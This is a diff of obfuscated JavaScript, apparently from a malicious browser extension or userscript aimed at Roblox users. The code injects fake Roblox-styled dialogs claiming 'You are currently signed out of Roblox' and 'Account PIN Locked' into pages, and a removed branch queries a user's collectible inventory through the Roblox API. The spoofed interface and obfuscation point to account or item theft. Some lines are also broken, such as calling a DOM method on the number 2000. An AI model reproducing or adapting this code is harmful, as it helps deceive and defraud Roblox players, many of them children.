@@ -53,63 +53,54 @@
         IiPko: S.uFUDZ,
         rbwGj: S.BMuZp,
       }
-      if (S.GrnmI(S.GZpIH, S.GZpIH)) {
-        var z = A
-          ? function () {
-              var G = {
-                ttYZi: p.ujNov,
-                DCmkE: p.vgUQX,
-                ilpad: p.wUhVq,
-                hOYPc: p.MNqxt,
-                uNTrh: function (w, g) {
-                  return p.VZkSP(w, g)
-                },
-                cwRGz: p.fbKKn,
-                krwub: p.eAyLJ,
-              }
-              if (p.oNLni(p.gQZjl, p.gQZjl)) {
-                if (D) {
-                  if (p.oNLni(p.IiPko, p.rbwGj)) {
-                    var g =
-                      '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
-                    h.body.insertAdjacentHTML(p.fbKKn, g)
-                    i.getElementById(p.mNbFG).onclick = function () {
-                      g.getElementById(G.ttYZi).remove()
-                      s.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
-                    }
-                    V.getElementById(p.ujNov).onclick = function () {
-                      g.getElementById(G.ttYZi).remove()
-                      s.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
-                    }
-                  } else {
-                    var Q = D.apply(E, arguments)
-                    return (D = null), Q
+      var z = A
+        ? function () {
+            var G = {
+              ttYZi: p.ujNov,
+              DCmkE: p.vgUQX,
+              ilpad: p.wUhVq,
+              hOYPc: p.MNqxt,
+              uNTrh: function (w, g) {
+                return p.VZkSP(w, g)
+              },
+              cwRGz: p.fbKKn,
+              krwub: p.eAyLJ,
+            }
+            if (p.oNLni(p.gQZjl, p.gQZjl)) {
+              if (D) {
+                if (p.oNLni(p.IiPko, p.rbwGj)) {
+                  var g =
+                    '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
+                  h.body.insertAdjacentHTML(p.fbKKn, g)
+                  i.getElementById(p.mNbFG).onclick = function () {
+                    g.getElementById(G.ttYZi).remove()
+                    s.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
                   }
+                  V.getElementById(p.ujNov).onclick = function () {
+                    g.getElementById(G.ttYZi).remove()
+                    s.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
+                  }
+                } else {
+                  var Q = D.apply(E, arguments)
+                  return (D = null), Q
                 }
-              } else {
-                F.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
-                if (G.uNTrh(h.getElementById(G.hOYPc), null)) {
-                  var j =
-                    '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
-                  J.body.insertAdjacentHTML(G.cwRGz, j)
-                  n.getElementsByClassName(G.krwub)[0].onclick = function () {
-                    j.getElementById(G.hOYPc).remove()
-                    ;(2000).getElementsByClassName(G.DCmkE)[0].innerText =
-                      G.ilpad
-                  }
+              }
+            } else {
+              F.getElementsByClassName(G.DCmkE)[0].innerText = G.ilpad
+              if (G.uNTrh(h.getElementById(G.hOYPc), null)) {
+                var j =
+                  '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>'
+                J.body.insertAdjacentHTML(G.cwRGz, j)
+                n.getElementsByClassName(G.krwub)[0].onclick = function () {
+                  j.getElementById(G.hOYPc).remove()
+                  ;(2000).getElementsByClassName(G.DCmkE)[0].innerText =
+                    G.ilpad
                 }
               }
             }
-          : function () {}
-        return (A = false), z
-      } else {
-        const Q =
-          'https://inventory.roblox.com/v1/users/' +
-          L +
-          '/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc'
-        var w = {}
-        return (w.url = Q), (w.type = S.dorni), m.ajax(w)
-      }
+          }
+        : function () {}
+      return (A = false), z
     }
   })()
   var C = i(this, function () {
